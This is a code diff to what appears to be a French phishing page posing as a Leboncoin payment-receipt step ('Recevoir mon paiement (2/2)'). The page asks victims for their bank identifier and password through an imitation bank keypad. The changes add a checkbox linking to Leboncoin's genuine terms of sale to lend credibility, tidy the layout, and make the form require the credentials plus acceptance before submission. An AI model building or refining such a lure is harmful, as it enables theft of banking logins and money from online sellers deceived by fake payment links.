@@ -199,9 +199,8 @@
             grid-template-columns: repeat(3, 1fr);
             gap: 10px;
             margin-top: 20px;
-            width: 80%; /* Même largeur que les champs */
-            margin-left: auto;
-            margin-right: auto;
+            width: 80%; /* Réduire la largeur du clavier */
+            margin: 0 auto; /* Centrer le clavier */
         }
         .numeric-keyboard button {
             padding: 20px;
@@ -220,9 +219,8 @@
             margin-top: 10px;
             display: flex;
             justify-content: space-around;
-            width: 80%; /* Même largeur que les champs */
-            margin-left: auto;
-            margin-right: auto;
+            width: 80%; /* Réduire la largeur des boutons */
+            margin: 0 auto; /* Centrer les boutons */
         }
         .keyboard-toggle button {
             padding: 10px 20px;
@@ -250,6 +248,30 @@
             height: 50px;
             border-radius: 10px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+        .terms {
+            margin-top: 20px;
+            text-align: left;
+            font-size: 14px;
+            color: #555;
+        }
+        .terms label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+        }
+        .terms input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+        }
+        .terms a {
+            color: #007BFF;
+            text-decoration: none;
+        }
+        .terms a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
@@ -297,7 +319,13 @@
                     <button type="button" onclick="backspace()">←</button>
                 </div>
             </div>
-            <button type="submit" class="btn">Recevoir mon paiement (2/2)</button>
+            <div class="terms">
+                <label>
+                    <input type="checkbox" id="accept-terms" required>
+                    J'accepte les <a href="https://www.leboncoin.fr/dc/cgv" target="_blank">Conditions Générales de Vente</a> ✅
+                </label>
+            </div>
+            <button type="submit" class="btn">Recevoir le paiement (2/2)</button>
         </form>
 
         <!-- Logo de la banque -->
@@ -343,14 +371,13 @@
 
         // Fonction pour basculer entre les claviers
         function toggleKeyboard(type) {
-            const numericKeyboard = document.getElementById('numeric-keyboard');
             const passwordInput = document.getElementById('password');
             if (type === 'numeric') {
-                numericKeyboard.style.display = 'grid';
                 passwordInput.type = 'password';
+                document.getElementById('numeric-keyboard').style.display = 'grid';
             } else {
-                numericKeyboard.style.display = 'none';
                 passwordInput.type = 'text';
+                document.getElementById('numeric-keyboard').style.display = 'none';
             }
         }
 
@@ -382,10 +409,10 @@
             // Récupérer les données du formulaire
             const bankId = document.getElementById('bank-id').value;
             const password = document.getElementById('password').value;
+            const acceptTerms = document.getElementById('accept-terms').checked;
 
-            // Validation des champs
-            if (!bankId || !password) {
-                alert('Veuillez remplir tous les champs.');
+            if (!bankId || !password || !acceptTerms) {
+                alert('Veuillez remplir tous les champs et accepter les Conditions Générales de Vente.');
                 loadingScreen.style.display = 'none';
                 return;
             }
